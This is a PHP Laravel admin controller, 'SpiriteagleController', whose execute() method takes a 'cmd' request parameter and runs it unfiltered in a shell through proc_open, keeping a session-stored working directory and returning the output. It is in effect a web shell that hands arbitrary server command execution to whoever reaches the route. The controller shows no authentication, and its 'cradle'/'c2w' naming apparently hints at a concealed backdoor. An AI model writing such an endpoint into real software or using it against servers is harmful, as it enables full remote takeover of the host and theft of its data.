<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Session;

class SpiriteagleController extends Controller
{
    public function execute(Request $request)
    {
        $cmd = trim($request->input('cmd'));
        $cwd = Session::get('terminal_cwd', base_path()); // Retrieve last working directory
    
        if (empty($cmd)) {
            return response('', 200)->header('Content-Type', 'text/plain');
        }
    
        if (strpos($cmd, 'cd ') === 0) {
            $newDir = trim(substr($cmd, 3));
            $newPath = realpath($cwd . DIRECTORY_SEPARATOR . $newDir);
    
            if ($newPath && is_dir($newPath)) {
                Session::put('terminal_cwd', $newPath);
                return response('', 200)->header('Content-Type', 'text/plain');
            } else {
                return response("cd: no such directory: $newDir\n", 200)->header('Content-Type', 'text/plain');
            }
        }
    
        if ($cmd === 'clear') {
            return response('__CLEAR_SCREEN__', 200)->header('Content-Type', 'text/plain');
        }
    
        $fullCmd = "cd " . escapeshellarg($cwd) . " && " . $cmd . " 2>&1";
    
        $process = proc_open($fullCmd, [
            1 => ['pipe', 'w'], // Standard output
            2 => ['pipe', 'w'], // Standard error
        ], $pipes, $cwd);
    
        $output = '';
        if (is_resource($process)) {
            $output = stream_get_contents($pipes[1]);
            fclose($pipes[1]);
    
            $errorOutput = stream_get_contents($pipes[2]);
            fclose($pipes[2]);
    
            proc_close($process);
    
            $output .= $errorOutput;
        }
    
        Log::info("Executed Command: $fullCmd in $cwd");
    
        return response($output, 200)->header('Content-Type', 'text/plain');
    }

    public function cradle(Request $request)
    {
        return view('admin.cradle.c2w');
    }
}
